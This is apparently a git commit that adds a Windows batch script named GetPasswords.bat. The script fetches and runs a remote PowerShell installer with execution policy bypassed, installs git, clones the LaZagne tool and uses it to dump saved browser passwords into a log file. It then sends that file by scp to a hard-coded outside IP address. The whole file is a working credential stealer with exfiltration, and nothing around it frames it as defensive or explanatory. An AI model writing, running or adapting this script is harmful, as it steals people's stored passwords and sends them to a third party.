e287410aa7e81cb05b94f0342d7227dcf0c94530
Mikey <80923101+skyyriiz@users.noreply.github.com>
2023-06-01 21:34:05 +0200

    Add files via upload

---
+++ GetPasswords.bat
@@ -0,0 +1,22 @@
+cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\
+
+REM curl -O https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe
+
+REM python-3.9.9-amd64.exe /quiet InstallAllUsers=1 PrependPath=1"
+
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"
+
+choco install git -y
+
+git clone https://github.com/AlessandroZ/LaZagne.git
+
+cd LaZagne
+
+pip install -r requirements.txt
+
+cd Windows
+
+python laZagne.py browsers > logs.txt
+
+scp logs.txt vnc@51.83.71.188:/home/mike/Desktop
+
